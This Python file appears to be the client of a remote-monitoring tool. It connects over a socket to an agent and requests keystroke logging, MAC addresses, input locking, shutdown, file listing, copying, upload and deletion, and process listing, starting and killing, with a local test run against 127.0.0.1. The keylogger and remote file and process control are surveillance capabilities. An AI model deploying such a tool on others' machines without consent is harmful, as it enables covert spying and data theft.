import my_socket
import socket
import time
import threading
from task_manager import process_opcode
from utils import stoppabe_thread
from file_management import *
from client import addText 
from server_socket import get_all_avail_host

BUF_SIZE = 32768
FILE_PORT = 26101
class SocketClient:
    def __init__(self):
        """
        Creates a new instance of StreamingClient.

        Parameters
        ----------

        host : str
            host address to connect to
        port : int
            port to connect to
        """
        self.running = False
        self.__lock = threading.Lock()
        self.__keylogger = None
        self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def __clean(self):
        self.running = False
        return None

    def __request(self, event, data = None):
        """
        Handles the individual server connections and processes their data.
        """
        try:
            # send request to server
            self.__client_socket.send([event, data])
            
            # receive response from server
            return self.__client_socket.recv(BUF_SIZE)
        except ConnectionResetError:
            return self.__clean()
        except ConnectionAbortedError:
            return self.__clean()
        except BrokenPipeError:
            return self.__clean()
        except OSError:
            return self.__clean()
    
    def __keyhook_loop(self, widget):
        while not threading.current_thread().is_stopped():
            with self.__lock:
                data = self.__request('request_key')
                if data is None:
                    return
                addText(widget, data)
            time.sleep(0.1)
            
    def disconnect(self):
        """
        Stops client stream if running
        """
        self.__lock.acquire()
        if self.running:
            self.__client_socket.close()
            self.running = False
        self.__lock.release()
        
    def connect(self, host, port):
        try:
            self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.__client_socket.connect((host, port))
            self.__client_socket = my_socket.socket_adapter(self.__client_socket)
            self.__host = host
            self.__port = port
            self.running = True
            return True
        except ConnectionRefusedError:
            return False
    
    def request_mac(self):
        return self.__request('request_mac')
    
    def start_keyhook(self, widget):
        if not self.__keylogger:
            self.__keylogger = stoppabe_thread(target = self.__keyhook_loop, 
                                               args=[widget], daemon = True)
            self.__keylogger.start()
            
    def stop_keyhook(self):
        self.__lock.acquire()
        if self.__keylogger:
            self.__request('stop_key')
            self.__keylogger.stop()
            self.__keylogger = None
        self.__lock.release()
        
    def logout(self):
        return self.__request("logout")
        
    def shutdown(self):
        return self.__request("shutdown")
        
    def control_input(self, is_lock = True):
        return self.__request("control_input", {"is_lock": is_lock})
        
    def request_listdir(self, root_path):
        return self.__request("file_management", 
                              {"opcode": file_opcode.LISTDIR, "path": root_path})
    
    def send_file(self, client_path, server_path):
        self.__request("file_management", 
                            {"opcode": file_opcode.PASTEFILE, 
                            "path": server_path})
        t = threading.Thread(target = send_file,
                              args=[[self.__host], FILE_PORT, client_path], daemon=True)
        t.start()
        
    def get_file(self, client_path, server_path):
        t = threading.Thread(target = recv_file, 
                             args = ['0.0.0.0', FILE_PORT, client_path], daemon = True)
        t.start()
        hosts = get_all_avail_host()
        self.__request("file_management", 
                        {"opcode": file_opcode.COPYFILE, 
                         "path": server_path, 
                         "hosts": hosts})
        
    def del_file(self, path):
        return self.__request("file_management", 
                            {"opcode": file_opcode.DELFILE, "path": path})
    
    def request_list_process(self):
        return self.__request("process_management", 
                       {"opcode": process_opcode.LISTPROC})
    
    def start_process(self, name):
        return self.__request("process_management", 
                       {"opcode": process_opcode.STARTPROC, "name": name})
    
    def kill_process(self, pid):
        return self.__request("process_management", 
                       {"opcode": process_opcode.KILLPROC, "pid": pid})
    
    def request_list_app(self):
        return self.__request("process_management", 
                       {"opcode": process_opcode.LISTAPP})
        
    def start_app(self, app_id):
        return self.__request("process_management", 
                       {"opcode": process_opcode.STARTAPP, "app_id": app_id})
        
if __name__ == "__main__":
    client = SocketClient()
    client.connect('127.0.0.1', 26100)
    # nics = client.request_mac()
    # for nic in nics:
    #     print(nic)
    # def keyhook_loop():
    #     while not threading.current_thread().is_stopped():
    #         data = client.request_key()
    #         if data is None:
    #             return
    #         print(data) # write new data to file
    #         time.sleep(0.1)
    
    # keylogger = stoppabe_thread(target=keyhook_loop, args=[], daemon=True)
    
    # keylogger.start()
    # time.sleep(10)
    # keylogger.stop()
    # client.stop_keyhook()
    # procs = client.request_list_process()
    # for proc in procs:
    #     if proc["is_app"]:
    #         print(proc)
            
    # client.start_process("dxdiag")
    # client.kill_process(11380)
    
    # apps = client.request_list_app()
    # for app in apps:
    #     print(app)
    # client.start_app(apps[0]["AppID"])
    client.get_file('E:\\abc.txt', 'C:\\Garena\\hehe.txt')
    client.send_file('E:\\repo\\remote-monitor\\README.md', 'E:\\send_file.txt')
    # files = client.request_listdir("E:\\")
    # for file in files["content"]:
    #     print(file["Filename"], file["Filetype"], file["Filesize"], file["Last modified"])
